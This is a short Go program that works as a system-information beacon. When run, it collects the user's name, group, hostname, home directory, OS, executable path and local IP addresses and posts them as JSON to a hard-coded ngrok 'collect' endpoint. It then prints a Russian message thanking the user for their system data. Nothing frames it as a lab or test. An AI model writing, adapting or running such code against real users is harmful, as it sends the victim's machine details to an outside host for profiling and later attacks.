package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/user"
	"runtime"
)

var reader = bufio.NewReader(os.Stdin)

type SystemInfo struct {
	UserName     string
	UserGroup    string
	HostName     string
	HomeDir      string
	OS           string
	Executable   string
	Architecture string
	IPs          []string
}

var info = SystemInfo{}
var serverURL string = "https://langston-subcarbonaceous-omari.ngrok-free.dev/collect"

func main() {
	collectData()

	sentDataToServer(info)
}

func collectData() {
	currentUser, err := user.Current()
	if err == nil {
		info.UserName = currentUser.Username
		info.UserGroup = currentUser.Gid
	}

	homeDir, err := os.UserHomeDir()
	if err == nil {
		info.HomeDir = homeDir
	}

	info.OS = runtime.GOOS
	info.Architecture = runtime.GOARCH
	result, err := os.Hostname()
	if err == nil {
		info.HostName = result
	}

	res, err := os.Executable()
	if err == nil {
		info.Executable = res
	}

	addrs, err := net.InterfaceAddrs()
	if err == nil {
		for _, addr := range addrs {
			if ipNet, ok := addr.(*net.IPNet); ok && !ipNet.IP.IsLoopback() {
				if ipNet.IP.To4() != nil {
					info.IPs = append(info.IPs, ipNet.IP.String())
				}
			}
		}
	}
}

func sentDataToServer(data SystemInfo) {
	jsonData, err := json.Marshal(data)
	if err != nil {
		fmt.Println("Error marshalling to JSON:", err.Error())
		return
	}

	resp, err := http.Post(serverURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Error sending request:", err.Error())
		return
	}
	defer resp.Body.Close() // закрыть тело ответа

	fmt.Println("Server response:", resp.Status)
	if resp.StatusCode == http.StatusOK {
		fmt.Println("Мы удачно получили данные вашей системы, спасибо!")
		fmt.Println("Нажите 'Enter' для закрытия консоли")
		reader.ReadString('\n')
	}
}
